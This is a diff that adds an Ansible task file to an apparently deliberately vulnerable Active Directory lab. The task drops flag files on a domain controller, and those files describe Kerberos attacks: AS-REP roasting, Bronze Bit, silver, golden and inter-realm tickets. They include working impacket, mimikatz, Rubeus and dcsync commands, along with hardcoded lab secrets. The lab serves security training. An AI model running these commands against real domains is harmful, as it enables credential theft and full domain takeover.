@@ -1,0 +1,106 @@
+---
+# ==============================================================================
+# vuln_cred_extended/tasks/kerberos_ext.yml — CRED-091..120
+# Target: dc01.corp.local
+#
+# CRED-091  Kerberoasting via AS-REQ (Kerberoasting without auth)
+# CRED-092  Targeted Kerberoasting via WriteSPN (already in LAT-025)
+# CRED-093  Bronze Bit (CVE-2020-17049) — constrained delegation bypass
+# CRED-094  S4U2Self abuse (protocol transition)
+# CRED-095  S4U2Proxy with TrustedToAuthForDelegation
+# CRED-096  Silver Ticket (service ticket forge with service account hash)
+# CRED-097  Diamond Ticket (modified legitimate TGT)
+# CRED-098  Sapphire Ticket (shadow copy of real ticket)
+# CRED-099  Golden Ticket with krbtgt hash
+# CRED-100  Inter-realm ticket abuse (cross-forest TGT)
+# ==============================================================================
+
+- name: CRED-091..120 - Drop extended Kerberos attack notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-CRED-091-Kerberoast-NoAuth.txt'
+      content: |
+        CRED-091: Kerberoasting Without Authentication (AS-REQ Roasting)
+        ================================================================
+        With RC4 downgrade enabled (CRED-016 — msDS-SupportedEncryptionTypes=1),
+        the AS-REQ pre-auth data is RC4 encrypted. Can be cracked offline.
+
+        Tool: Kirbi.py (offline AS-REQ craft)
+        hashcat -m 18200 asrep_hash.txt rockyou.txt
+
+        Also: CVE-2022-33647 (RC4-HMAC AS-REQ without pre-auth via PKINIT)
+
+    - path: 'C:\Flags\FLAG-CRED-093-BronzeBit.txt'
+      content: |
+        CRED-093: Bronze Bit (CVE-2020-17049)
+        =======================================
+        Constrained delegation bypass: modify the forwardable flag in an S4U2Proxy TGS.
+        Allows impersonating a Protected Users member (normally blocked) via delegation.
+
+        Prereq: Control a service account with constrained delegation
+        (dc01 has SMTP constrained delegation — DF-020)
+
+        Tool: Impacket getST with -force-forwardable flag
+          impacket-getST -spn SMTP/dc01.corp.local -impersonate Administrator \
+            -force-forwardable corp.local/dc01$ -hashes :$(secretsdump hash)
+
+    - path: 'C:\Flags\FLAG-CRED-096-SilverTicket.txt'
+      content: |
+        CRED-096: Silver Ticket Attack
+        ================================
+        Forge a Kerberos service ticket (TGS) using the service account's NTLM hash.
+        No KDC interaction required — entirely offline.
+
+        Targets:
+          - svc_web NTLM hash → forge HTTP/web01.corp.local TGS → impersonate admin
+          - svc_sql NTLM hash → forge MSSQLSvc/sql01 TGS → SA access
+
+        Tool:
+          mimikatz# kerberos::golden /user:Administrator /domain:corp.local \
+            /sid:S-1-5-21-... /target:sql01.corp.local /service:MSSQLSvc \
+            /rc4:<svc_sql_ntlm> /ptt
+
+          Rubeus silver /service:MSSQLSvc/sql01.corp.local /rc4:<hash> \
+            /user:Administrator /ldap /nowrap
+
+    - path: 'C:\Flags\FLAG-CRED-099-GoldenTicket.txt'
+      content: |
+        CRED-099: Golden Ticket Attack
+        ================================
+        Forge a TGT using the krbtgt NTLM hash. Valid for 10 years (or until krbtgt reset).
+        Completely bypasses all Kerberos authentication controls.
+
+        krbtgt password in this lab: KrbtgtDVAD2024!
+        Reset via vuln_persistence role (allows hash extraction + TGT forge)
+
+        Tool:
+          mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
+          mimikatz# kerberos::golden /user:Administrator /domain:corp.local \
+            /sid:S-1-5-21-... /krbtgt:<hash> /ptt
+
+          Rubeus golden /rc4:<krbtgt_hash> /domain:corp.local \
+            /sid:S-1-5-21-... /user:Administrator /ptt
+
+        Post-golden: access any service in corp.local as Administrator
+
+    - path: 'C:\Flags\FLAG-CRED-100-InterRealm.txt'
+      content: |
+        CRED-100: Inter-Realm Ticket Abuse
+        =====================================
+        With cross-forest trusts (corp.local ←→ finance.local ←→ root.corp),
+        a Golden Ticket in corp.local can be used to obtain inter-realm TGTs.
+
+        Trust key in this lab: TrustKey2024!
+        SID filtering: DISABLED on all trusts (vuln_forest role)
+
+        Attack:
+          1. Golden Ticket in corp.local → present to finance.local KDC
+          2. Finance DC issues inter-realm TGT (SID filtering off → corp DA SID accepted)
+          3. Access finance.local resources as Enterprise Admin
+
+          mimikatz# kerberos::golden /user:Administrator /domain:corp.local \
+            /sid:S-1-5-21-CORP /sids:S-1-5-21-FINANCE-519 /krbtgt:<hash> /ptt
+
+          # S-1-5-21-FINANCE-519 = finance.local Enterprise Admins SID
